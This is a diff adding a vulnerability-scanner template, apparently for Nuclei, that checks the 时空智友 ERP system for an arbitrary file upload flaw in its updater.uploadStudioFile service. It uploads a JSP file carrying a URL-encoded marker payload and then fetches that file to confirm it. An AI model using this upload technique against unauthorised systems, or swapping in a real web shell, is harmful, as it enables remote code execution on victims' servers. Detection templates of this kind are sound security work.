@@ -1,0 +1,52 @@
+id: skzy-erp-updater-uploadstudiofile-anyfile-upload
+
+info:
+  name: 时空智友ERP系统 updater.uploadStudioFile 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+  description: |
+    时空智友ERP系统的 `updater.uploadStudioFile` 服务存在任意文件上传漏洞。攻击者可以利用该漏洞上传恶意文件，可能进一步导致服务器被完全控制。
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{md5('9999')}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: file-upload
+    name: Upload Malicious File
+    method: POST
+    path:
+      - "{{BaseURL}}/formservice?service=updater.uploadStudioFile"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      content=<?xml%20version="1.0"?><root><filename>{{t1}}.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01%2008:00:00</lmtime></root><!--%3c%25%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%22%66%61%32%34%36%64%30%32%36%32%63%33%39%32%35%36%31%37%62%30%63%37%32%62%62%32%30%65%65%62%31%64%22%29%20%3b%25%3e-->
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "文件大小错误"
+
+  - id: file-verification
+    name: Verify File Upload
+    method: GET
+    path:
+      - "{{BaseURL}}/update/temp/studio/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<filename>"
+          - "<root>"
+          - "{{t1}}"
+          - "!--{{t2}}"
